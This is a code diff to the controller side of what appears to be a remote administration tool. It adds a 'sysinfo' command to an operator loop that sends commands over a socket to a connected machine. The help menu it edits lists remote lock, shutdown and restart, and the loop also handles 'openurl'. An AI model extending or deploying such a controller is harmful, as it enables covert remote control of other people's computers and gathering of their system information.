@@ -114,7 +114,7 @@ def socketAccept():
 
 def sendCommands(conn):
     while True:
-        cmd = input('\n' + CYAN + str(addr[0]) + ':' + str(addr[1]) + ' > ' + END + GREEN)
+        cmd = input(CYAN + str(addr[0]) + ':' + str(addr[1]) + ' > ' + END)
 
         if cmd == 'quit':
             conn.close()
@@ -143,6 +143,11 @@ def sendCommands(conn):
             print('lock                     Lock computer screen')
             print('shutdown                 Shutdown computer')
             print('restart                  Restart computer')
+            print('                     ')
+        elif cmd == 'sysinfo':
+            conn.send(str.encode(cmd))
+            clientResponse = str(conn.recv(1024), "utf-8")
+            print(clientResponse)
         elif cmd == 'clear':
             subprocess.call(['clear'])
         elif cmd == '':
@@ -159,6 +164,7 @@ def sendCommands(conn):
             conn.send(str.encode(cmd))
             clientResponse = str(conn.recv(1024), 'utf-8')
             print(clientResponse)
+            print('             ')
         elif cmd[:7] == 'openurl':
             conn.send(str.encode(cmd))
             clientResponse = str(conn.recv(1024), "utf-8")
@@ -220,6 +226,8 @@ def sendCommands(conn):
             conn.send(str.encode(cmd))
             clientResponse = str(conn.recv(1024), "utf-8")
             print('\n' + clientResponse, end="")
+        else:
+            print(RED + '\n[!] Command no recognized\n' + END)
 
 
 def main():
